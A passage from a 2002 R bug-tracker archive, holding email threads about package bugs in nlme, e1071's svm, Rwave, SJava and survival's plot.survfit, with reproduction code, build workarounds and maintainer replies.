      eval(mCall, envir = parent.frame()) 
    }
    else {
      mCall[[1]] <- as.name("nmGroupedData") 
      eval(mCall, envir = parent.frame()) 
    }
    #######
}
 
ProcessPar<-function(par)
{
  form1<-as.formula(paste(par,"~age|Subject"))
  oxg3<-groupedData(formula=form1, data=ox)
  # Do processing with 
  print(str(oxg3))
}


# Works only with the patch to groupedData constructor
ProcessPar("height")



==> 1741.audit <==
Thu Jul  4 20:02:01 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1745 *
Subject: nlme: failed augPred with NA in an unused column
From: dieter.menne@menne-biomed.de
Date: Fri, 5 Jul 2002 08:32:32 +0200 (MET DST)
--nlme needs an update as suggested in the followup
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1745 <==
From dieter.menne@menne-biomed.de  Fri Jul  5 08:32:33 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA19682
	for <R-bugs@biostat.ku.dk>; Fri, 5 Jul 2002 08:32:32 +0200 (MET DST)
Date: Fri, 5 Jul 2002 08:32:32 +0200 (MET DST)
From: dieter.menne@menne-biomed.de
Message-Id: <200207050632.IAA19682@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: nlme: failed augPred with NA in an unused column

Full_Name: Dieter Menne
Version: 1.5.1
OS: win2000
Submission from: (NULL) (212.185.252.139)


nlme Version: 3.1-27

gsummary fails if any of the columns contains an NA.

 varying <- unlist(lapply(object, function(column, frst) {
        aux <- as.character(column)
        any(aux != aux[frst])
    }, frst = asFirst))
>>    if (any(varying) && (!invariantsOnly)) {

Error in if (any(varying) && (!invariantsOnly)) { : 
        missing value where logical needed

This probably is by design (an more verbose error message would help),
but as a consequence augPred also fails even if
the column is not used at all in the fit.
  
------------------------------------------------
library(nlme)
data(Orthodont)
# add a column with an NA that is not used in the fit
Orthodont$Others<-runif(nrow(Orthodont))
is.na(Orthodont$Others[3])<-T
fm1 <- lme(Orthodont, random = ~1)
augPred(fm1, length.out = 2, level = c(0,1))
--------------------------------------------------
#Error in if (any(varying) && (!invariantsOnly)) { : 
#        missing value where logical needed


==> 1745.followup.1 <==
From ripley@stats.ox.ac.uk  Fri Jul  5 09:07:19 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA19893
	for <R-bugs@biostat.ku.dk>; Fri, 5 Jul 2002 09:07:18 +0200 (MET DST)
Received: from auk.stats (pc1-oxfd1-4-cust16.oxf.cable.ntl.com [62.254.131.16])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id IAA29244;
	Fri, 5 Jul 2002 08:06:36 +0100 (BST)
Date: Fri, 5 Jul 2002 08:06:12 +0100 (BST)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Sender: ripley@auk.stats
To: dieter.menne@menne-biomed.de
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: nlme: failed augPred with NA in an unused column (PR#1745)
In-Reply-To: <200207050632.IAA19687@pubhealth.ku.dk>
Message-ID: <Pine.GSO.4.44.0207050804430.20175-100000@auk.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

An update was needed for 1.5.x: see file 150update.txt on
developer.r-project.org.

On Fri, 5 Jul 2002 dieter.menne@menne-biomed.de wrote:

> Full_Name: Dieter Menne
> Version: 1.5.1
> OS: win2000
> Submission from: (NULL) (212.185.252.139)
>
>
> nlme Version: 3.1-27
>
> gsummary fails if any of the columns contains an NA.
>
>  varying <- unlist(lapply(object, function(column, frst) {
>         aux <- as.character(column)
>         any(aux != aux[frst])
>     }, frst = asFirst))
> >>    if (any(varying) && (!invariantsOnly)) {
>
> Error in if (any(varying) && (!invariantsOnly)) { :
>         missing value where logical needed
>
> This probably is by design (an more verbose error message would help),
> but as a consequence augPred also fails even if
> the column is not used at all in the fit.
>
> ------------------------------------------------
> library(nlme)
> data(Orthodont)
> # add a column with an NA that is not used in the fit
> Orthodont$Others<-runif(nrow(Orthodont))
> is.na(Orthodont$Others[3])<-T
> fm1 <- lme(Orthodont, random = ~1)
> augPred(fm1, length.out = 2, level = c(0,1))
> --------------------------------------------------
> #Error in if (any(varying) && (!invariantsOnly)) { :
> #        missing value where logical needed
>
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1745.followup.2 <==
From dieter.menne@menne-biomed.de  Fri Jul  5 09:30:00 2002
Received: from moutng0.schlund.de (moutng0.kundenserver.de [212.227.126.170])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA20078
	for <r-bugs@biostat.ku.dk>; Fri, 5 Jul 2002 09:29:59 +0200 (MET DST)
Received: from [212.227.126.160] (helo=mrelayng0.kundenserver.de)
	by moutng0.schlund.de with esmtp (Exim 3.22 #2)
	id 17QNWp-0002Fr-00; Fri, 05 Jul 2002 09:29:19 +0200
Received: from [217.81.145.111] (helo=SERVER)
	by mrelayng0.kundenserver.de with asmtp (Exim 3.35 #1)
	id 17QNWo-0002ER-00; Fri, 05 Jul 2002 09:29:18 +0200
X-KENId: 00003336KEN05721367
X-KENRelayed: 00003336KEN05721367@SERVER
Received: from 192.168.0.5:1144
   by KEN! DSL (192.168.0.1:25) with SMTP
   ; Fri, 5 Jul 2002 09:29:10 +0200
Date: Fri, 5 Jul 2002 09:30:28 +0200
From: "Dieter Menne" <dieter.menne@menne-biomed.de>
Subject: nlme: failed augPred with NA in an unused column (PR#1745)
To: "Prof Brian D Ripley" <ripley@stats.ox.ac.uk>
Cc: <R-bugs@biostat.ku.dk>
Reply-To: <dieter.menne@menne-biomed.de>
Message-Id: <JLEPLGAANFCEAEDCAGJNOEHMCCAA.dieter.menne@menne-biomed.de>
In-Reply-To: <Pine.GSO.4.44.0207050804430.20175-100000@auk.stats>
Mime-Version: 1.0
Content-Type: text/plain;
   charset="us-ascii"
X-Priority: 3 (Normal)
Content-Transfer-Encoding: 7bit
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook IMO, Build 9.0.2416 (9.0.2911.0)
Importance: Normal
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000


gsummary and augPred looks ok with

    varying <- unlist(lapply(object, function(column, frst) {
        aux <- as.character(column)
        any(!identical(aux, aux[frst])) # changed
    }, frst = asFirst))

> Von: ripley@auk.stats [mailto:ripley@auk.stats]Im Auftrag von Prof Brian
> An update was needed for 1.5.x: see file 150update.txt on
> developer.r-project.org.
> 
> On Fri, 5 Jul 2002 dieter.menne@menne-biomed.de wrote:
> 
> > Full_Name: Dieter Menne
> > nlme Version: 3.1-27




==> 1745.audit <==
Fri Jul 19 09:47:01 2002	ripley	changed notes
Fri Jul 19 09:47:01 2002	ripley	foobar
Fri Jul 19 09:47:01 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1901 *
Subject: svm seg faults
From: stefan.boehringer+science@uni-bochum.de
Date: Tue, 13 Aug 2002 14:12:17 +0200 (MET DST)
--Seem to be due to gcc `2.96' from RH7.3
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1901 <==
From stefan.boehringer+science@uni-bochum.de  Tue Aug 13 14:12:17 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA10666
	for <R-bugs@biostat.ku.dk>; Tue, 13 Aug 2002 14:12:17 +0200 (MET DST)
Date: Tue, 13 Aug 2002 14:12:17 +0200 (MET DST)
From: stefan.boehringer+science@uni-bochum.de
Message-Id: <200208131212.OAA10666@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: svm seg faults
MIME-Version: 1.0
Content-Type: text/plain; charset=unknown-8bit
Content-Transfer-Encoding: 8bit

Full_Name: Stefan Böhringer
Version: 1.5.1
OS: Linux RH 7.3
Submission from: (NULL) (132.252.142.137)


using the svm function from the e1071 library. R crashes with the very example
from the help page or any other input.
In gdb the crash appears to occur in Cache::lru_delete at smv.cpp:93


==> 1901.followup.1 <==
From ripley@stats.ox.ac.uk  Tue Aug 13 14:44:27 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA11224
	for <R-bugs@biostat.ku.dk>; Tue, 13 Aug 2002 14:44:26 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id NAA20058;
	Tue, 13 Aug 2002 13:43:29 +0100 (BST)
Date: Tue, 13 Aug 2002 13:43:29 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: <stefan.boehringer+science@uni-bochum.de>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: Re: svm seg faults (PR#1901)
In-Reply-To: <200208131212.OAA10671@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0208131336280.461-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=X-UNKNOWN
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from QUOTED-PRINTABLE to 8bit by pubhealth.ku.dk id OAA11224

Which compiler is this?

I have no problems with svm() on RH7.2 compiling with either gcc 3.1 or
gcc 2.95.3: Red Hat make a habit of supplying unreleased (and buggy)
versions of gcc. I think this is particularly critical when C/C++ mixtures
are used (as in svm).

PR#1178 is another non-reproducible segfault in svm on Linux.

On Tue, 13 Aug 2002 stefan.boehringer+science@uni-bochum.de wrote:

> Full_Name: Stefan Böhringer
> Version: 1.5.1
> OS: Linux RH 7.3
> Submission from: (NULL) (132.252.142.137)
>
>
> using the svm function from the e1071 library. R crashes with the very example
> from the help page or any other input.
> In gdb the crash appears to occur in Cache::lru_delete at smv.cpp:93

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1901.followup.2 <==
From stefan.boehringer@ruhr-uni-bochum.de  Tue Aug 13 14:50:08 2002
Received: from sunu422.rz.ruhr-uni-bochum.de (sunu422.rz.ruhr-uni-bochum.de [134.147.64.14])
	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id OAA11331
	for <R-bugs@biostat.ku.dk>; Tue, 13 Aug 2002 14:50:08 +0200 (MET DST)
Received: (qmail 5840 invoked by uid 82); 13 Aug 2002 12:49:27 -0000
Received: from stefan.boehringer@ruhr-uni-bochum.de by mailhost with qmail-scanner-1.00 (uvscan: v4.1.40/v4217. . Clean. Processed in 3.867663 secs); 13 Aug 2002 12:49:27 -0000
Received: from unknown (HELO ?192.168.0.84?) (boehrsbu@132.252.142.137)
  by mailhost.rz.ruhr-uni-bochum.de with SMTP; 13 Aug 2002 12:49:19 -0000
Subject: Re: svm seg faults (PR#1901)
From: Stefan =?ISO-8859-1?Q?B=F6hringer?=
	 <stefan.boehringer@ruhr-uni-bochum.de>
To: ripley@stats.ox.ac.uk
Cc: stefan.boehringer+science@uni-bochum.de, r-devel@stat.math.ethz.ch,
        R-bugs@biostat.ku.dk
In-Reply-To: <Pine.LNX.4.31.0208131336280.461-100000@gannet.stats>
References: <Pine.LNX.4.31.0208131336280.461-100000@gannet.stats>
Content-Type: text/plain; charset=ISO-8859-1
X-Mailer: Ximian Evolution 1.0.8 
Date: 13 Aug 2002 14:23:07 +0200
Message-Id: <1029241389.6475.9.camel@hgX>
Mime-Version: 1.0
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id OAA11331

I've used the stock 2.96 gcc. Also I have 3.1 installed as gcc3 but
couldn't get around to make R compile with gcc3.

Thanks

On Tue, 2002-08-13 at 14:43, ripley@stats.ox.ac.uk wrote:
> Which compiler is this?
> 
> I have no problems with svm() on RH7.2 compiling with either gcc 3.1 or
> gcc 2.95.3: Red Hat make a habit of supplying unreleased (and buggy)
> versions of gcc. I think this is particularly critical when C/C++ mixtures
> are used (as in svm).
> 
> PR#1178 is another non-reproducible segfault in svm on Linux.
> 
> On Tue, 13 Aug 2002 stefan.boehringer+science@uni-bochum.de wrote:
> 
> > Full_Name: Stefan Böhringer
> > Version: 1.5.1
> > OS: Linux RH 7.3
> > Submission from: (NULL) (132.252.142.137)
> >
> >
> > using the svm function from the e1071 library. R crashes with the very example
> > from the help page or any other input.
> > In gdb the crash appears to occur in Cache::lru_delete at smv.cpp:93
> 
> -- 
> Brian D. Ripley,                  ripley@stats.ox.ac.uk
> Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
> University of Oxford,             Tel:  +44 1865 272861 (self)
> 1 South Parks Road,                     +44 1865 272860 (secr)
> Oxford OX1 3TG, UK                Fax:  +44 1865 272595
> 
> 
-- 
Stefan Böhringer                                Tel. +49 201 723 4681
University Clinics Essen                        Fax. +49 201 723 5900
Hufelandstr. 55                        stefan.boehringer@uni-essen.de
45122 Essen, Germany  http://homepage.uni-bochum.de/stefan.boehringer


==> 1901.followup.3 <==
From stefan.boehringer@ruhr-uni-bochum.de  Thu Aug 15 13:53:03 2002
Received: from sunu422.rz.ruhr-uni-bochum.de (sunu422.rz.ruhr-uni-bochum.de [134.147.64.14])
	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id NAA27110
	for <R-bugs@biostat.ku.dk>; Thu, 15 Aug 2002 13:53:03 +0200 (MET DST)
Received: (qmail 18069 invoked by uid 82); 15 Aug 2002 11:52:23 -0000
Received: from stefan.boehringer@ruhr-uni-bochum.de by mailhost with qmail-scanner-1.00 (uvscan: v4.1.40/v4218. . Clean. Processed in 2.593797 secs); 15 Aug 2002 11:52:23 -0000
Received: from unknown (HELO ?192.168.0.84?) (boehrsbu@132.252.142.137)
  by mailhost.rz.ruhr-uni-bochum.de with SMTP; 15 Aug 2002 11:52:19 -0000
Subject: Re: svm seg faults (PR#1901)
From: Stefan =?ISO-8859-1?Q?B=F6hringer?=
	 <stefan.boehringer@ruhr-uni-bochum.de>
To: ripley@stats.ox.ac.uk
Cc: stefan.boehringer+science@uni-bochum.de, r-devel@stat.math.ethz.ch,
        R-bugs@biostat.ku.dk
In-Reply-To: <Pine.LNX.4.31.0208131336280.461-100000@gannet.stats>
References: <Pine.LNX.4.31.0208131336280.461-100000@gannet.stats>
Content-Type: text/plain; charset=ISO-8859-1
X-Mailer: Ximian Evolution 1.0.8 
Date: 15 Aug 2002 13:26:06 +0200
Message-Id: <1029410767.1964.15.camel@hgX>
Mime-Version: 1.0
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id NAA27110

Thank you for the hint.
I rebuild gcc and R from scratch and now it works. Here's how on RH7.3,
which might help others:

configured gcc with: --enable-languages=c,c++,objc,f77
--program-suffix=3 --prefix=/usr

in config.site for R the following variables are then set:
CC=gcc3
F77=f773
CXX=g++3
LDFLAGS=-L/usr/lib/gcc-lib/i686-pc-linux-gnu/3.1
-L/usr/lib/gcc-lib/i686-pc-linux-gnu

Thank you very much again.

Best wishes,

	Stefan

On Tue, 2002-08-13 at 14:43, ripley@stats.ox.ac.uk wrote:
> Which compiler is this?
> 
> I have no problems with svm() on RH7.2 compiling with either gcc 3.1 or
> gcc 2.95.3: Red Hat make a habit of supplying unreleased (and buggy)
> versions of gcc. I think this is particularly critical when C/C++ mixtures
> are used (as in svm).
> 
> PR#1178 is another non-reproducible segfault in svm on Linux.
> 
> On Tue, 13 Aug 2002 stefan.boehringer+science@uni-bochum.de wrote:
> 
> > Full_Name: Stefan Böhringer
> > Version: 1.5.1
> > OS: Linux RH 7.3
> > Submission from: (NULL) (132.252.142.137)
> >
> >
> > using the svm function from the e1071 library. R crashes with the very example
> > from the help page or any other input.
> > In gdb the crash appears to occur in Cache::lru_delete at smv.cpp:93
> 
> -- 
> Brian D. Ripley,                  ripley@stats.ox.ac.uk
> Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
> University of Oxford,             Tel:  +44 1865 272861 (self)
> 1 South Parks Road,                     +44 1865 272860 (secr)
> Oxford OX1 3TG, UK                Fax:  +44 1865 272595
> 
> 
-- 
Stefan Böhringer                                Tel. +49 201 723 4681
University Clinics Essen                        Fax. +49 201 723 5900
Hufelandstr. 55                        stefan.boehringer@uni-essen.de
45122 Essen, Germany  http://homepage.uni-bochum.de/stefan.boehringer


==> 1901.reply.1 <==
From p.dalgaard@biostat.ku.dk  Mon Aug 19 15:22:40 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA19080;
	Mon, 19 Aug 2002 15:22:39 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.6/8.11.6) id g7JDMYd29846;
	Mon, 19 Aug 2002 15:22:34 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: ripley@stats.ox.ac.uk
Cc: <stefan.boehringer+science@uni-bochum.de>, <r-devel@stat.math.ethz.ch>,
        <R-bugs@biostat.ku.dk>
Subject: Re: svm seg faults (PR#1901)
References: <Pine.LNX.4.31.0208131336280.461-100000@gannet.stats>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 19 Aug 2002 15:22:34 +0200
In-Reply-To: <Pine.LNX.4.31.0208131336280.461-100000@gannet.stats>
Message-ID: <x2adnjf0f9.fsf@biostat.ku.dk>
Lines: 19
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

ripley@stats.ox.ac.uk writes:

> Which compiler is this?
> 
> I have no problems with svm() on RH7.2 compiling with either gcc 3.1 or
> gcc 2.95.3: Red Hat make a habit of supplying unreleased (and buggy)
> versions of gcc. I think this is particularly critical when C/C++ mixtures
> are used (as in svm).
> 
> PR#1178 is another non-reproducible segfault in svm on Linux.

It *is* reproducible on another stock RH7.3, though. I might try
digging a little deeper when I recover from the NY/Boston meetings. 

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1901.audit <==
Tue Aug 13 23:15:07 2002	ripley	moved from incoming to Add-ons
Sun Aug 25 11:59:09 2002	ripley	changed notes
Sun Aug 25 11:59:09 2002	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1974 *
Subject: Rwave installation problem
From: ld-temp-qt3i@pobox.com
Date: Mon, 2 Sep 2002 09:27:36 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1974 <==
From ld-temp-qt3i@pobox.com  Mon Sep  2 09:27:37 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA27886
	for <R-bugs@biostat.ku.dk>; Mon, 2 Sep 2002 09:27:36 +0200 (MET DST)
Date: Mon, 2 Sep 2002 09:27:36 +0200 (MET DST)
From: ld-temp-qt3i@pobox.com
Message-Id: <200209020727.JAA27886@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Rwave installation problem

Full_Name: Linc Davis
Version: 1.5.1
OS: Mac OS 10.1.5
Submission from: (NULL) (68.4.90.94)


When running install.packages("Rwave") as root, I got this error:

In file included from compinteg.c:12:
kernel.h:22: malloc.h: No such file or directory
make: *** [compinteg.o] Error 1
ERROR: compilation failed for package 'Rwave'

There are 3 header files 'malloc.h' in Mac OS X: one for generic C, one for
Objective-C, and a private one for the OS. The R installation script looks for C
headers in /usr/include, but the actual path to this one is

/usr/include/sys/malloc.h

I worked around the problem by copying the file as indicated, then I deleted the
copy after compiling the package. To fix the bug, the script should be changed
to look for C headers in both /usr/include and /usr/include/sys.

Thanks.

==> 1974.audit <==
Tue Sep 17 11:20:29 2002	maechler	foobar
Tue Sep 17 11:20:29 2002	maechler	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1977 *
Subject: Bugs in $RHOME/src/library/SJava/src/makefile.win
From: grimm.hinz@rcc.ch
Date: Tue, 3 Sep 2002 13:13:17 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1977 <==
From grimm.hinz@rcc.ch  Tue Sep  3 13:13:18 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id NAA11538
	for <R-bugs@biostat.ku.dk>; Tue, 3 Sep 2002 13:13:17 +0200 (MET DST)
Date: Tue, 3 Sep 2002 13:13:17 +0200 (MET DST)
From: grimm.hinz@rcc.ch
Message-Id: <200209031113.NAA11538@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Bugs in $RHOME/src/library/SJava/src/makefile.win

Full_Name: Heinz Grimm
Version: R1.5.1
OS: Windows NT
Submission from: (NULL) (195.65.178.178)


Line 11 is:
"DLLLIBS=-L'c:/jdk1.3/lib' -L$(JAVA_HOME)/jre/bin/hotspot...."
should be:
"DLLLIBS=-L$(JAVA_HOME)/lib -L$(JAVA_HOME)/jre/bin/hotspot...."

Line 59 is:
"	(cd .. ; ./configure.win $(RHOME))"
should be:
"	(cd .. ; sh ./configure.win $(RHOME))"


==> 1977.followup.1 <==
From dmurdoch@pair.com  Tue Sep  3 14:28:52 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA12713
	for <R-bugs@biostat.ku.dk>; Tue, 3 Sep 2002 14:28:51 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id OAA04776
	for <r-bugs@stat.math.ethz.ch>; Tue, 3 Sep 2002 14:27:49 +0200 (MET DST)
Received: from tomts7.bellnexxia.net(209.226.175.40), claiming to be "tomts7-srv.bellnexxia.net"
 via SMTP by hypatia, id smtpdAAAa001Aa; Tue Sep  3 14:27:44 2002
Received: from djmfuj ([216.209.254.52]) by tomts7-srv.bellnexxia.net
          (InterMail vM.5.01.04.19 201-253-122-122-119-20020516) with SMTP
          id <20020903122707.MMEW4608.tomts7-srv.bellnexxia.net@djmfuj>;
          Tue, 3 Sep 2002 08:27:07 -0400
From: Duncan Murdoch <dmurdoch@pair.com>
To: grimm.heinz@rcc.ch
Cc: r-bugs@stat.math.ethz.ch
Subject: Re: Bugs in $RHOME/src/library/SJava/src/makefile.win (PR#1977)
Date: Tue, 03 Sep 2002 08:28:05 -0400
Message-ID: <8ka9nusn5bl6rcju2a54bulkdk0rbvdoj9@4ax.com>
References: <200209031113.NAA11543@pubhealth.ku.dk>
In-Reply-To: <200209031113.NAA11543@pubhealth.ku.dk>
X-Mailer: Forte Agent 1.91/32.564
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

SJava isn't part of R, it's a contributed package.  You should send
bug reports to the maintainer, Duncan Temple Lang
<duncan@research.bell-labs.com>. 

In general maintainers should be listed in the DESCRIPTION file of any
package.

Duncan Murdoch

P.S. Your return address is misconfigured as grimm.hinz@rcc.ch

On Tue, 3 Sep 2002 13:13:19 +0200 (MET DST), you wrote:

>Full_Name: Heinz Grimm
>Version: R1.5.1
>OS: Windows NT
>Submission from: (NULL) (195.65.178.178)
>
>
>Line 11 is:
>"DLLLIBS=-L'c:/jdk1.3/lib' -L$(JAVA_HOME)/jre/bin/hotspot...."
>should be:
>"DLLLIBS=-L$(JAVA_HOME)/lib -L$(JAVA_HOME)/jre/bin/hotspot...."
>
>Line 59 is:
>"	(cd .. ; ./configure.win $(RHOME))"
>should be:
>"	(cd .. ; sh ./configure.win $(RHOME))"
>
>
>-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
>r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
>Send "info", "help", or "[un]subscribe"
>(in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
>_._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._


==> 1977.audit <==
Tue Sep  3 18:10:08 2002	thomas	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1978 *
Subject: SJava 0.65, Sample Java files are missing
From: grimm.heinz@rcc.ch
Date: Tue, 3 Sep 2002 13:24:30 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1978 <==
From grimm.heinz@rcc.ch  Tue Sep  3 13:24:30 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id NAA11688
	for <R-bugs@biostat.ku.dk>; Tue, 3 Sep 2002 13:24:30 +0200 (MET DST)
Date: Tue, 3 Sep 2002 13:24:30 +0200 (MET DST)
From: grimm.heinz@rcc.ch
Message-Id: <200209031124.NAA11688@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: SJava 0.65, Sample Java files are missing

Full_Name: Heinz Grimm
Version: R1.5.1
OS: Windows NT
Submission from: (NULL) (195.65.178.178)


The ROmegahatExamples.JAR of SJava_0.65-0.tar.gz doesn't content the sample JAVA
classes JavaRCall, JavaRPlot... of the package org/omegahat/R/Java/Examples.

==> 1978.audit <==
Tue Sep  3 18:10:08 2002	thomas	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2173 *
Subject: xlim in plot.survfit() [with a discussion on "..."]
From: jerome@hivnet.ubc.ca
Date: Wed, 16 Oct 2002 18:46:11 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2173 <==
From jerome@hivnet.ubc.ca  Wed Oct 16 18:46:12 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA00603
	for <R-bugs@biostat.ku.dk>; Wed, 16 Oct 2002 18:46:11 +0200 (MET DST)
Date: Wed, 16 Oct 2002 18:46:11 +0200 (MET DST)
From: jerome@hivnet.ubc.ca
Message-Id: <200210161646.SAA00603@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: xlim in plot.survfit() [with a discussion on "..."]

Full_Name: Jerome Asselin
Version: 1.6.0
OS: RedHat 7.2
Submission from: (NULL) (24.83.203.63)



Hello,

I am trying to draw a legend on top of survival curves using
plot.survfit(). As in the example below, I would like to
specify a large interval for the x-axis. I can achieve such
result using "xlim". However, an error occurs if I use the
legend.pos and legend.text parameters as well.

  library(survival)
  TIME  <- Surv(c(23,52,12,56,23,21),c(T,F,T,F,F,T))

  par(mfrow=c(2,1))
  plot(survfit(TIME~1),conf.int=F,xlim=c(0,100),
  main="xlim=c(0,100) without legend")
  plot(survfit(TIME~1),conf.int=F,xlim=c(0,100),
  legend.pos=0,legend.text="Survival Curve",
  main="xlim=c(0,100) with legend (ERROR!)")

It looks like plot.survfit() attempts to send the "xlim"
parameter to legend(), which does not accept "xlim" as a
parameter. Hence, an error occurs and the legend is not
plotted.

I believe the problem is due to the fact that the
additional parameters "..." that are supplied to
plot.survfit() do not necessarily match the range of
possible parameters for both plot() and legend(). In my
case, "xlim" is matched by plot(), but not by legend().

I know how to plot the legend by directly using the
legend() function. However, in order to correct the
small problem with plot.survfit(), I would suggest that
plot.survfit() be modified to perform an exact match of
the parameters in "..." onto legend(). Perhaps there is
already a function to perform such a task. If not, I
believe it could provide a practical solution for
dealing with "..." and subfunctions that do not have a
built-in "..." parameter. That's just a suggestion,
though.

Thank you very much!
Jerome Asselin


==> 2173.audit <==
Wed Oct 16 22:58:03 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Analyses

none

Directory:  Documentation

* PR# 988 *
Subject: input for R-intro
From: "Paul E. Johnson" <pauljohn@ku.edu>
Date: Mon, 18 Jun 2001 13:57:10 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 988 <==
From pauljohn@ku.edu  Mon Jun 18 21:03:09 2001
Received: from lark.cc.ku.edu (root@lark.cc.ku.edu [129.237.34.2])
